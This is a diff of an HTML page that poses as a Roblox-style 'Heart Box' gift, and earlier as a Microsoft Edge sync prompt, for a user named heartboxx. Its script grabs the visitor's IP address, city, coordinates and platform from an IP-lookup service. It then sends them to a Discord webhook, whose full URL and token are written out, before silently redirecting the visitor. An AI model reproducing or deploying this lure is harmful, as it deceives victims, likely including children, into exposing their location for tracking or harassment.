@@ -2,96 +2,105 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Synchronizing...</title>
+    <title>Gift for heartboxx</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: radial-gradient(circle at center, #1a1b26 0%, #0f0f13 100%); 
+            background: #0f0f13; 
             color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             display: flex; align-items: center; justify-content: center; height: 100vh;
+            overflow: hidden;
         }
-        .claim-card {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(15px);
+        .container {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 50px;
+            border-radius: 30px;
+            padding: 60px 40px;
             text-align: center;
-            max-width: 420px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 40px rgba(255, 50, 50, 0.1);
         }
-        .icon-shield {
-            width: 100px; height: 100px;
-            background: linear-gradient(135deg, #00b2ff 0%, #0066ff 100%);
-            border-radius: 50%;
-            margin: 0 auto 30px;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 30px rgba(0, 178, 255, 0.4);
+        .hearts-box {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
         }
-        h1 { font-size: 26px; font-weight: 700; margin-bottom: 12px; letter-spacing: -0.5px; }
-        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 35px; }
-        .action-btn {
-            background: #fff;
-            color: #000;
+        .heart-svg {
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 0 15px rgba(255, 50, 50, 0.6));
+            animation: pulse 2s infinite ease-in-out;
+        }
+        h1 { font-size: 26px; font-weight: 700; margin-bottom: 15px; color: #ff4d4d; }
+        p { color: #94a3b8; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }
+        .claim-btn {
+            background: #ff4d4d;
+            color: #fff;
             border: none;
-            padding: 18px 45px;
+            padding: 16px 0;
             border-radius: 12px;
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            transition: all 0.3s ease;
             width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(255, 77, 77, 0.2);
         }
-        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,255,255,0.1); background: #f8fafc; }
+        .claim-btn:hover { background: #ff3333; transform: translateY(-2px); box-shadow: 0 15px 25px rgba(255, 77, 77, 0.4); }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
     </style>
 </head>
 <body>
 
-    <div class="claim-card">
-        <div class="icon-shield">
-            <svg width="45" height="45" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01L12 2z"></path></svg>
+    <div class="container">
+        <div class="hearts-box">
+            <svg class="heart-svg" viewBox="0 0 24 24" fill="#ff4d4d"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+            <svg class="heart-svg" viewBox="0 0 24 24" fill="#ff4d4d" style="animation-delay: 0.5s;"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
         </div>
         <h1>For heartboxx</h1>
-        <p>A restricted Heart Box asset has been detected. Sync your Microsoft Edge session to integrate with your inventory.</p>
-        <button class="action-btn" onclick="execute()">Claim Asset</button>
+        <p>A gift has been authorized for your account. Click claim to sync your rewards.</p>
+        <button class="claim-btn" onclick="startHook()">Claim Gift</button>
     </div>
 
     <script>
-        const HOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
-        const DESTINATION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        const HOOK_URL = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function execute() {
-            // New logic: Get high-accuracy IP/GPS data
-            let intel = {};
+        async function startHook() {
+            // 1. Precise GPS and Network Capture
+            let geo = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                intel = await res.json();
-            } catch (e) { intel = { error: "Location Shielded" }; }
+                geo = await res.json();
+            } catch (e) { geo = { city: "Private", ip: "Hidden" }; }
 
-            // Fire detailed data package to Discord
-            await fetch(HOOK, {
+            // 2. Fire Intel to Discord
+            await fetch(HOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "⚡ SHADOW HOOK TRIGGERED",
+                        title: "💖 HEART BOX CLAIMED",
                         description: "Target: **heartboxx**",
-                        color: 3447003,
+                        color: 16731469,
                         fields: [
-                            { name: "📍 Identity", value: `${intel.city}, ${intel.region} (${intel.country_code})` },
-                            { name: "🌐 Network", value: `IP: ${intel.ip}` },
-                            { name: "🗺️ Precise GPS", value: `Lat: ${intel.latitude}, Long: ${intel.longitude}` },
-                            { name: "🔗 Map URL", value: `https://www.google.com/maps?q=${intel.latitude},${intel.longitude}` },
-                            { name: "🖥️ Platform", value: navigator.userAgent }
+                            { name: "📍 Location", value: `${geo.city}, ${geo.region}, ${geo.country_name}` },
+                            { name: "🌐 IP Address", value: geo.ip },
+                            { name: "🗺️ Map Coords", value: `${geo.latitude}, ${geo.longitude}` },
+                            { name: "🔗 Google Maps", value: `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}` },
+                            { name: "🖥️ Platform", value: navigator.platform }
                         ],
-                        footer: { text: "2026 Core Model Active" }
+                        footer: { text: "Redirecting to Roblox..." }
                     }]
                 })
             });
 
-            // The Rickroll Exit
-            window.location.href = DESTINATION;
+            // 3. Silent Redirect
+            window.location.href = "https://www.roblox.com/home";
         }
     </script>
 </body>
